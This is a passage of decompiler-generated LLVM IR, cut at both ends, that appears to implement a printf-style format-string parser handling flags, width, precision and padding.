  %v2_10f10 = icmp eq i8 %v2_10f0c, 0
  br i1 %v2_10f10, label %dec_label_pc_114b8, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f0c
  %v1_10f18 = add i32 %v0_10f20, 1
  %v2_10f18 = inttoptr i32 %v1_10f18 to i8*
  %v3_10f18 = load i8, i8* %v2_10f18, align 1
  %v7_10f1c = icmp eq i8 %v3_10f18, 37
  store i32 %v1_10f18, i32* %r2.global-to-local, align 4
  br i1 %v7_10f1c, label %dec_label_pc_114a8, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f18
  store i32 %v2_10e08, i32* @r4, align 4
  store i32 %v2_10e08, i32* %r0.global-to-local, align 4
  store i32 %v1_10f18, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10f3c = call i32 @function_117d0(i8* %v1_10f3c)
  store i32 %v2_10e08, i32* @r0, align 4
  %v0_10f44 = call i32 @function_115cc()
  store i32 %v0_10f44, i32* %r0.global-to-local, align 4
  store i32 %v4_10f4c, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_10f28
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_10f28, %bb145
  %storemerge = phi i32 [ %v10_10f5c, %bb145 ], [ %v7_10f58, %dec_label_pc_10f28 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_10f84195, label %dec_label_pc_10f68, label %dec_label_pc_10f88

dec_label_pc_10f68:                               ; preds = %bb146, %dec_label_pc_10f68
  %v5_10f74197 = phi i32 [ %v5_10f74, %dec_label_pc_10f68 ], [ %v2_10f70, %bb146 ]
  %v0_10f68196 = phi i32 [ %v1_10f6c, %dec_label_pc_10f68 ], [ %storemerge, %bb146 ]
  %v2_10f68 = add i32 %v5_10f74197, -32
  %v3_10f68 = inttoptr i32 %v2_10f68 to i32*
  store i32 %v0_10f68196, i32* %v3_10f68, align 4
  %v0_10f6c = load i32, i32* %r0.global-to-local, align 4
  %v1_10f6c = add i32 %v0_10f6c, 8
  store i32 %v1_10f6c, i32* %r0.global-to-local, align 4
  %v1_10f74.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_10f74 = mul i32 %v1_10f74.pre, 4
  %v5_10f74 = add i32 %v4_10f74, %v2_10f70
  %v1_10f80 = add i32 %v1_10f74.pre, 1
  store i32 %v1_10f80, i32* %r2.global-to-local, align 4
  %v5_10f84 = icmp slt i32 %v1_10f74.pre, %tmp105
  br i1 %v5_10f84, label %dec_label_pc_10f68, label %dec_label_pc_10f88

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10f68, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_10f8c, label %dec_label_pc_10f94, label %dec_label_pc_10fb8

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f88
  %v3_10f94 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_11388, i32* @ip, align 4
  %v1_10fa0 = inttoptr i32 %v3_10f94 to i32*
  %v2_10fa0 = load i32, i32* %v1_10fa0, align 4
  store i32 %v2_10fa0, i32* %r0.global-to-local, align 4
  %v1_10fa4 = and i32 %v0_10ff0, 3840
  store i32 %v1_11388, i32* %r2.global-to-local, align 4
  %v3_10fac = ashr i32 %v1_11388, 31
  %v4_10fb0 = inttoptr i32 %v2_10fa0 to i16*
  %v5_10fb0 = call i32 @function_16400(i16* %v4_10fb0, i32 %v1_10fa4, i32 %v1_11388, i32 %v3_10fac)
  store i32 %v5_10fb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1149c

dec_label_pc_10fb8:                               ; preds = %dec_label_pc_10f88
  br i1 %tmp207, label %dec_label_pc_11154, label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb8
  %v3_10fd0 = load i8, i8* %v2_10fd0, align 1
  %v4_10fd0 = zext i8 %v3_10fd0 to i32
  store i32 %v4_10fd0, i32* @r4, align 4
  %v7_10fd4 = icmp eq i8 %v3_10fd0, 10
  br i1 %v7_10fd4, label %dec_label_pc_10fe0, label %bb147

bb147:                                            ; preds = %dec_label_pc_10fc0
  br label %bb151

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fc0
  %v1_10ff0 = and i32 %v0_10ff0, 64
  %v2_10ff0 = icmp eq i32 %v1_10ff0, 0
  br i1 %v2_10ff0, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_10fe0
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_10fe0, %bb150
  br i1 %v3_10ffc, label %.thread, label %dec_label_pc_11004

.thread:                                          ; preds = %bb151
  %v5_10ffc = sub nsw i32 0, %v4_10fd0
  store i32 %v5_10ffc, i32* @r4, align 4
  br label %dec_label_pc_1101c

dec_label_pc_11004:                               ; preds = %bb151
  br i1 %v7_110e0, label %bb152, label %dec_label_pc_11010

bb152:                                            ; preds = %dec_label_pc_11004
  br label %dec_label_pc_1101c

dec_label_pc_11010:                               ; preds = %dec_label_pc_11004
  br i1 %v7_11030, label %dec_label_pc_11020, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %.thread, %bb152, %dec_label_pc_11010
  %v0_1104881 = phi i32 [ %v5_10ffc, %.thread ], [ %v4_10fd0, %bb152 ], [ %v4_10fd0, %dec_label_pc_11010 ]
  br label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %dec_label_pc_11010, %dec_label_pc_1101c
  %v0_1104880 = phi i32 [ %v0_1104881, %dec_label_pc_1101c ], [ %v4_10fd0, %dec_label_pc_11010 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_1101c ], [ 6, %dec_label_pc_11010 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_11020 = load i32, i32* %stack_var_-348, align 4
  %v1_11024 = icmp slt i32 %v3_11020, 0
  %v7_11028. = select i1 %v1_11024, i32 %v7_11028, i32 32
  store i32 %v7_11028., i32* @sb, align 4
  br i1 %v7_11030, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_11020
  store i32 %v2_10f70, i32* %r2.global-to-local, align 4
  %v2_11038 = load i32, i32* @ip, align 4
  %v5_11038 = mul i32 %v2_11038, 4
  %v6_11038 = add i32 %v5_11038, %v2_10f70
  %v2_1103c = add i32 %v6_11038, -276
  %v3_1103c = inttoptr i32 %v2_1103c to i32*
  %v4_1103c = load i32, i32* %v3_1103c, align 4
  %v2_11044 = and i32 %v4_1103c, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_11020, %.thread15
  %storemerge93 = phi i32 [ %v2_11044, %.thread15 ], [ 1024, %dec_label_pc_11020 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_1104880, i32* @r2, align 4
  %v3_1104c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1104c, i32* @r1, align 4
  %v0_11050 = call i32 @function_16390()
  store i32 %v0_11050, i32* @r2, align 4
  %v0_1105c = load i32, i32* @r1, align 4
  store i32 %v0_1105c, i32* @r3, align 4
  store i32 %v2_11060, i32* %r0.global-to-local, align 4
  %v2_11068 = call i32 @function_1642c(i8* %v1_11068)
  store i32 %v2_11068, i32* %r0.global-to-local, align 4
  store i32 %v2_11068, i32* @r4, align 4
  br i1 %v3_11078, label %bb160, label %dec_label_pc_1107c

dec_label_pc_1107c:                               ; preds = %bb157
  %v3_11068 = inttoptr i32 %v2_11068 to i8*
  %v3_1107c = load i8, i8* %v3_11068, align 1
  %v7_11080 = icmp eq i8 %v3_1107c, 45
  %v2_11088 = or i32 %v0_10ff0, 2
  %v2_11088.stack_var_-336.0 = select i1 %v7_11080, i32 %v2_11088, i32 %v0_10ff0
  br i1 %v7_11080, label %.thread17, label %dec_label_pc_1109c

.thread17:                                        ; preds = %dec_label_pc_1107c
  %v3_1108c = add i32 %v2_11068, 1
  store i32 %v3_1108c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_1109c:                               ; preds = %dec_label_pc_1107c
  %v1_1109c = and i32 %v2_11088.stack_var_-336.0, 2
  %v2_1109c = icmp eq i32 %v1_1109c, 0
  br i1 %v2_1109c, label %dec_label_pc_110a8, label %bb158

bb158:                                            ; preds = %dec_label_pc_1109c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_110a8:                               ; preds = %dec_label_pc_1109c
  %v1_110a8 = urem i32 %v2_11088.stack_var_-336.0, 2
  %v2_110a8 = icmp eq i32 %v1_110a8, 0
  br i1 %v2_110a8, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_110a8
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_110a8, %bb159
  %v0_11104 = phi i32 [ %v2_11068, %bb157 ], [ %v3_1108c, %.thread17 ], [ %v2_11068, %dec_label_pc_110a8 ], [ %v2_11068, %bb159 ], [ %v2_11068, %bb158 ]
  %v0_110c0 = phi i32 [ %v0_10ff0, %bb157 ], [ %v2_11088, %.thread17 ], [ %v0_10ff0, %dec_label_pc_110a8 ], [ %v0_10ff0, %bb159 ], [ %v0_10ff0, %bb158 ]
  %v3_110b0 = load i32, i32* %stack_var_-348, align 4
  %v1_110b8 = icmp slt i32 %v3_110b0, 0
  br i1 %v1_110b8, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_110b0, %bb160 ]
  %v0_110e8 = phi i32 [ 1, %bb161 ], [ %v3_110b0, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_110c0 = and i32 %v0_110c0, 16
  %v2_110c0 = icmp eq i32 %v1_110c0, 0
  %v2_110cc = sub i32 %v2_11060, %v0_11104
  store i32 %v2_110cc, i32* @r5, align 4
  br i1 %v2_110c0, label %bb169, label %dec_label_pc_110d4

dec_label_pc_110d4:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_110d4
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_110d4, %bb163
  br i1 %v7_110e0, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_110e8, %v2_110cc
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_110ec, label %dec_label_pc_110f4, label %bb169

dec_label_pc_110f4:                               ; preds = %bb167
  %v1_110f4 = inttoptr i32 %v0_11104 to i8*
  %v2_110f4 = load i8, i8* %v1_110f4, align 1
  %v7_110f8 = icmp eq i8 %v2_110f4, 48
  br i1 %v7_110f8, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_110f4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_110f4
  %v2_11100 = add i32 %v2_110cc, 1
  store i32 %v2_11100, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_11144 = phi i32 [ %v0_110e8, %bb167 ], [ %v0_110e8, %bb162 ], [ 1, %bb168 ], [ %v2_11100, %.thread24 ], [ %v0_110e8, %bb166 ]
  %v1_11104 = inttoptr i32 %v0_11104 to i8*
  %v2_11104 = load i8, i8* %v1_11104, align 1
  %v7_11108 = icmp eq i8 %v2_11104, 48
  br i1 %v7_11108, label %dec_label_pc_11110, label %dec_label_pc_11140

dec_label_pc_11110:                               ; preds = %bb169
  %v0_11114 = load i32, i32* @r6, align 4
  %v7_11118 = icmp slt i32 %v0_11114, 6
  br i1 %v7_11118, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_11110
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_11110, %bb170
  br i1 %v7_11030, label %.thread27, label %dec_label_pc_11134

.thread27:                                        ; preds = %bb171
  store i32 144312, i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 108148, i32* @r4, align 4
  br label %dec_label_pc_1114c

dec_label_pc_11134:                               ; preds = %bb171
  %v2_11134 = icmp eq i32 %v5_11144, 0
  br i1 %v2_11134, label %bb172, label %dec_label_pc_11140

bb172:                                            ; preds = %dec_label_pc_11134
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1114c

dec_label_pc_11140:                               ; preds = %dec_label_pc_11134, %bb169
  %v2_11140 = sub i32 %v5_11144, %v2_110cc
  %tmp211 = icmp ugt i32 %v5_11144, %v2_110cc
  br i1 %tmp211, label %.thread85, label %dec_label_pc_1114c

.thread85:                                        ; preds = %dec_label_pc_11140
  store i32 %v2_11140, i32* @r8, align 4
  br label %dec_label_pc_11358thread-pre-split

dec_label_pc_1114c:                               ; preds = %dec_label_pc_11140, %.thread27, %bb172
  %v1_1135c.pre205 = phi i32 [ %v2_110cc, %dec_label_pc_11140 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_11358thread-pre-split

dec_label_pc_11154:                               ; preds = %dec_label_pc_10fb8
  br i1 %tmp208, label %dec_label_pc_11194, label %dec_label_pc_1115c

dec_label_pc_1115c:                               ; preds = %dec_label_pc_11154
  %v3_1116c = load i32, i32* %stack_var_-72, align 4
  %v0_11170 = load i32, i32* @fp, align 4
  store i32 %v0_11170, i32* %r0.global-to-local, align 4
  %v1_11174 = inttoptr i32 %v3_1116c to i32*
  %v2_11174 = load i32, i32* %v1_11174, align 4
  store i32 %v2_11174, i32* %r2.global-to-local, align 4
  %v3_11174 = add i32 %v3_1116c, 4
  %v4_11174 = inttoptr i32 %v3_11174 to i32*
  %v5_11174 = load i32, i32* %v4_11174, align 4
  %v6_11178 = inttoptr i32 %v5_11174 to i32*
  %v7_11178 = call i32 @function_16588(i32 %v0_11170, i32 68988, i32 %v2_11174, i32* %v6_11178, i32 %v2_11308, i32 68988)
  store i32 %v7_11178, i32* %r0.global-to-local, align 4
  %v1_1117c = icmp slt i32 %v7_11178, 0
  br i1 %v1_1117c, label %dec_label_pc_114b0, label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_1115c
  %v2_11188 = add i32 %v7_11178, %v1_11388
  store i32 %v2_11188, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1149c

dec_label_pc_11194:                               ; preds = %dec_label_pc_11154
  br i1 %v3_11198, label %dec_label_pc_1121c, label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11194
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_111a4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_111a4, i32* %r0.global-to-local, align 4
  br i1 %v7_11194, label %dec_label_pc_111ac, label %dec_label_pc_111e4

dec_label_pc_111ac:                               ; preds = %dec_label_pc_1119c
  %v1_111ac = inttoptr i32 %v3_111a4 to i32*
  %v2_111ac = load i32, i32* %v1_111ac, align 4
  %v9_111b0 = icmp eq i32 %v2_111ac, 0
  store i32 %v2_111ac, i32* %stack_var_-44, align 4
  br i1 %v9_111b0, label %dec_label_pc_1125c, label %dec_label_pc_111bc

dec_label_pc_111bc:                               ; preds = %dec_label_pc_111ac
  %v3_111bc = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_111c0, i32* @r0, align 4
  %v4_111c4 = ashr i32 %v3_111bc, 31
  %v5_111c4 = or i32 %v4_111c4, %v3_111bc
  store i32 %v5_111c4, i32* %r2.global-to-local, align 4
  store i32 %v2_111c0, i32* @r1, align 4
  %v6_111d0 = call i32 @function_15b1c(i32 %v2_111c0, i32 %v2_111c0, i32 %v5_111c4, i32 %v2_111cc, i32 0, i32 %v2_111ac)
  store i32 %v6_111d0, i32* %r0.global-to-local, align 4
  %v3_111d4 = icmp eq i32 %v6_111d0, -1
  store i32 %v6_111d0, i32* @r5, align 4
  br i1 %v3_111d4, label %dec_label_pc_114b0, label %dec_label_pc_11348

dec_label_pc_111e4:                               ; preds = %dec_label_pc_1119c
  store i32 %v2_112c4, i32* %r7.global-to-local, align 4
  %v1_111e8 = inttoptr i32 %v3_111a4 to i32*
  %v2_111e8 = load i32, i32* %v1_111e8, align 4
  store i32 %v2_111cc, i32* %r2.global-to-local, align 4
  store i32 %v2_112c4, i32* %r0.global-to-local, align 4
  %v5_111f4 = call i32 @function_15ac8(i32 %v2_112c4, i32 %v2_111e8, i32 %v2_111cc, i32 %tmp105, i32 0)
  store i32 %v5_111f4, i32* %r0.global-to-local, align 4
  %v7_111f8 = icmp eq i32 %v5_111f4, -1
  store i32 %v5_111f4, i32* @r5, align 4
  br i1 %v7_111f8, label %dec_label_pc_114b0, label %dec_label_pc_11204

dec_label_pc_11204:                               ; preds = %dec_label_pc_111e4
  %v0_11204 = load i32, i32* @sl, align 4
  store i32 %v0_11204, i32* @r8, align 4
  store i32 %v2_112c4, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_11214 = trunc i32 %v0_11204 to i8
  %v2_11214 = load i32, i32* %r7.global-to-local, align 4
  %v4_11214 = add i32 %v2_11214, %v5_111f4
  %v5_11214 = inttoptr i32 %v4_11214 to i8*
  store i8 %v1_11214, i8* %v5_11214, align 1
  %v0_1135c.pre.pre = load i32, i32* @r8, align 4
  %v1_1135c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11358thread-pre-split

dec_label_pc_1121c:                               ; preds = %dec_label_pc_11194
  br i1 %v3_11220, label %dec_label_pc_112b8, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_1121c
  %v3_11224 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_11224, i32* %r0.global-to-local, align 4
  %v1_1122c = inttoptr i32 %v3_11224 to i32*
  %v2_1122c = load i32, i32* %v1_1122c, align 4
  br i1 %v7_1121c, label %dec_label_pc_1122c, label %dec_label_pc_11290

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11224
  store i32 %v2_1122c, i32* @r4, align 4
  %v2_11230 = icmp eq i32 %v2_1122c, 0
  br i1 %v2_11230, label %dec_label_pc_1125c, label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_1122c, %dec_label_pc_112c0
  %v0_1123c = phi i32 [ %v2_1122c, %dec_label_pc_1122c ], [ %v3_112d0, %dec_label_pc_112c0 ]
  %v3_11238 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_1123c, i32* %r0.global-to-local, align 4
  %v4_11240 = ashr i32 %v3_11238, 31
  %v5_11240 = or i32 %v4_11240, %v3_11238
  %v2_11244 = inttoptr i32 %v0_1123c to i8*
  %v3_11244 = call i32 @function_1215c(i8* %v2_11244, i32 %v5_11240)
  store i32 %v3_11244, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_11244, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_11358

dec_label_pc_1125c:                               ; preds = %dec_label_pc_1122c, %dec_label_pc_111ac
  %v3_1125c = load i32, i32* %stack_var_-348, align 4
  %v1_11260 = icmp slt i32 %v3_1125c, 0
  br i1 %v1_11260, label %dec_label_pc_11278, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_1125c
  %tmp212 = icmp ult i32 %v3_1125c, 6
  br i1 %tmp212, label %dec_label_pc_11280, label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_11268, %dec_label_pc_1125c
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %dec_label_pc_11268, %dec_label_pc_11278
  %storemerge97 = phi i32 [ 6, %dec_label_pc_11278 ], [ 0, %dec_label_pc_11268 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a67c.209 to i32), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_11358

dec_label_pc_11290:                               ; preds = %dec_label_pc_11224
  store i32 %v2_1122c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_112c4, i32* @r4, align 4
  store i32 %v2_1122c, i32* %stack_var_-200, align 4
  br label %dec_label_pc_11358thread-pre-split

dec_label_pc_112b8:                               ; preds = %dec_label_pc_1121c
  br i1 %v7_112b8, label %dec_label_pc_112c0, label %dec_label_pc_112dc

dec_label_pc_112c0:                               ; preds = %dec_label_pc_112b8
  %v0_112c0 = call i32 @function_1095c()
  store i32 %v0_112c0, i32* %r0.global-to-local, align 4
  %v1_112c8 = inttoptr i32 %v0_112c0 to i32*
  %v2_112c8 = load i32, i32* %v1_112c8, align 4
  store i32 %v2_112c8, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_112d0 = call i32 @function_123f8(i32 %v2_112c8, i32 %v2_112c4, i32 128)
  store i32 %v3_112d0, i32* %r0.global-to-local, align 4
  store i32 %v3_112d0, i32* @r4, align 4
  br label %dec_label_pc_11238

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112b8
  %v4_112e4 = load i32, i32* inttoptr (i32 144856 to i32*), align 8
  %v1_112ec = add i32 %v4_112e4, 10
  store i32 %v1_112ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_11338, %dec_label_pc_112dc
  %v1_11300 = phi i32 [ %v1_11338, %dec_label_pc_11338 ], [ %v4_112e4, %dec_label_pc_112dc ]
  %v1_112f0 = inttoptr i32 %v1_11300 to i8*
  %v2_112f0 = load i8, i8* %v1_112f0, align 1
  %v3_112f0 = zext i8 %v2_112f0 to i32
  store i32 %v3_112f0, i32* %r2.global-to-local, align 4
  %v9_112f8 = icmp eq i32 %v3_112f0, %tmp99
  br i1 %v9_112f8, label %dec_label_pc_11300, label %dec_label_pc_11338

dec_label_pc_11300:                               ; preds = %dec_label_pc_112f0
  %v2_11300 = sub i32 %v1_11300, %v4_112e4
  %v0_11304 = load i32, i32* @fp, align 4
  store i32 %v0_11304, i32* %r0.global-to-local, align 4
  store i32 %v2_1130c, i32* %r2.global-to-local, align 4
  %v4_11314 = mul i32 %v2_11300, 4
  %v5_11314 = add i32 %v4_11314, ptrtoint (i32* @global_var_297a4.211 to i32)
  %v6_11314 = inttoptr i32 %v5_11314 to i32*
  %v7_11314 = load i32, i32* %v6_11314, align 4
  store i32 %v7_11314, i32* @ip, align 4
  store i32 70432, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11314)
  %v0_11320 = load i32, i32* %r0.global-to-local, align 4
  %v1_11320 = icmp slt i32 %v0_11320, 0
  br i1 %v1_11320, label %dec_label_pc_114b0, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_11300
  %v2_1132c = add i32 %v0_11320, %v1_11388
  br label %dec_label_pc_1149c

dec_label_pc_11338:                               ; preds = %dec_label_pc_112f0
  %v1_11338 = add i32 %v1_11300, 1
  %v3_1133c = icmp ult i32 %v1_11338, %v1_112ec
  br i1 %v3_1133c, label %dec_label_pc_112f0, label %dec_label_pc_114b0

dec_label_pc_11348:                               ; preds = %dec_label_pc_111bc
  %v0_11348 = load i32, i32* @sl, align 4
  store i32 %v0_11348, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_11348, i32* @r4, align 4
  br label %dec_label_pc_11358

dec_label_pc_11358thread-pre-split:               ; preds = %.thread85, %dec_label_pc_1114c, %dec_label_pc_11204, %dec_label_pc_11290
  %v1_1135c.pre = phi i32 [ %v1_1135c.pre205, %dec_label_pc_1114c ], [ %v1_1135c.pre.pre, %dec_label_pc_11204 ], [ 1, %dec_label_pc_11290 ], [ %v2_110cc, %.thread85 ]
  %v0_1135c.pre = phi i32 [ 0, %dec_label_pc_1114c ], [ %v0_1135c.pre.pre, %dec_label_pc_11204 ], [ 0, %dec_label_pc_11290 ], [ %v2_11140, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_110c0, %dec_label_pc_1114c ], [ %v0_10ff0, %dec_label_pc_11204 ], [ %v0_10ff0, %dec_label_pc_11290 ], [ %v0_110c0, %.thread85 ]
  %v0_11358.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_11358thread-pre-split, %dec_label_pc_11280, %dec_label_pc_11238, %dec_label_pc_11348
  %v1_1135c = phi i32 [ %v1_1135c.pre, %dec_label_pc_11358thread-pre-split ], [ %storemerge97, %dec_label_pc_11280 ], [ %v3_11244, %dec_label_pc_11238 ], [ %v6_111d0, %dec_label_pc_11348 ]
  %v0_1135c = phi i32 [ %v0_1135c.pre, %dec_label_pc_11358thread-pre-split ], [ 0, %dec_label_pc_11280 ], [ 0, %dec_label_pc_11238 ], [ %v0_11348, %dec_label_pc_11348 ]
  %v0_11364 = phi i32 [ %v0_11358.pr, %dec_label_pc_11358thread-pre-split ], [ 11, %dec_label_pc_11280 ], [ 11, %dec_label_pc_11238 ], [ 11, %dec_label_pc_11348 ]
  %v0_113a4 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_11358thread-pre-split ], [ %v0_10ff0, %dec_label_pc_11280 ], [ %v0_10ff0, %dec_label_pc_11238 ], [ %v0_10ff0, %dec_label_pc_11348 ]
  %v7_11358 = icmp eq i32 %v0_11364, 11
  %v2_1135c = add i32 %v1_1135c, %v0_1135c
  br i1 %v7_11358, label %dec_label_pc_11374, label %bb173

bb173:                                            ; preds = %dec_label_pc_11358
  %v7_1136c = icmp sgt i32 %v0_11364, 5
  %. = select i1 %v7_1136c, i32 2, i32 1
  %v2_11370 = add i32 %v2_1135c, %.
  br label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11358, %bb173
  %v0_11388 = phi i32 [ %v2_1135c, %dec_label_pc_11358 ], [ %v2_11370, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_11378 = icmp uge i32 %tmp98, %v0_11388
  %v9_11378 = icmp eq i32 %tmp98, %v0_11388
  %v2_1137c = xor i1 %v9_11378, true
  %v3_1137c = and i1 %v3_11378, %v2_1137c
  br i1 %v3_1137c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_11374
  %v2_11378 = sub i32 %tmp98, %v0_11388
  store i32 %v2_11378, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_11374, %bb174
  store i32 %v1_11388, i32* %r2.global-to-local, align 4
  %v2_11384 = xor i1 %v3_11378, true
  %v3_11384 = or i1 %v9_11378, %v2_11384
  br i1 %v3_11384, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_1138c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_1139c = phi i32 [ %v1_1138c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_11388 = add i32 %v0_11388, %v1_11388
  %v2_1138c = add i32 %v2_11388, %v2_1139c
  %v0_11398 = load i32, i32* @sb, align 4
  %v7_11398 = icmp eq i32 %v0_11398, 48
  br i1 %v7_11398, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_1139c = add i32 %v2_1139c, %v0_1135c
  store i32 %v3_1139c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_113b4 = phi i32 [ %v2_1139c, %bb177 ], [ 0, %bb178 ]
  %v1_113a4 = and i32 %v0_113a4, 8
  store i32 %v1_113a4, i32* @r7, align 4
  %v2_113a4 = icmp eq i32 %v1_113a4, 0
  br i1 %v2_113a4, label %dec_label_pc_113ac, label %dec_label_pc_113c8

dec_label_pc_113ac:                               ; preds = %.thread30
  %v0_113ac = load i32, i32* @fp, align 4
  store i32 %v0_113ac, i32* %r0.global-to-local, align 4
  store i32 %v0_113b4, i32* %r2.global-to-local, align 4
  %v4_113b8 = call i32 @function_10d28(i32 %v0_113ac, i8 32, i32 %v0_113b4)
  store i32 %v4_113b8, i32* %r0.global-to-local, align 4
  %v1_113bc = load i32, i32* @sl, align 4
  %v9_113bc = icmp eq i32 %v4_113b8, %v1_113bc
  br i1 %v9_113bc, label %dec_label_pc_113c4, label %dec_label_pc_114b0

dec_label_pc_113c4:                               ; preds = %dec_label_pc_113ac
  %v0_113c4 = load i32, i32* @r7, align 4
  store i32 %v0_113c4, i32* @sl, align 4
  %v0_113d0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %.thread30, %dec_label_pc_113c4
  %v0_113d0 = phi i32 [ %v0_11364, %.thread30 ], [ %v0_113d0.pre, %dec_label_pc_113c4 ]
  %v0_113cc = load i32, i32* @fp, align 4
  %v2_113d0 = add i32 %v0_113d0, ptrtoint (i32* @global_var_1a684.207 to i32)
  store i32 %v2_113d0, i32* %r0.global-to-local, align 4
  %v2_113d4 = call i32 @function_11e48(i32 %v2_113d0, i32 %v0_113cc)
  %v0_113d8 = load i32, i32* @fp, align 4
  store i32 %v0_113d8, i32* %r0.global-to-local, align 4
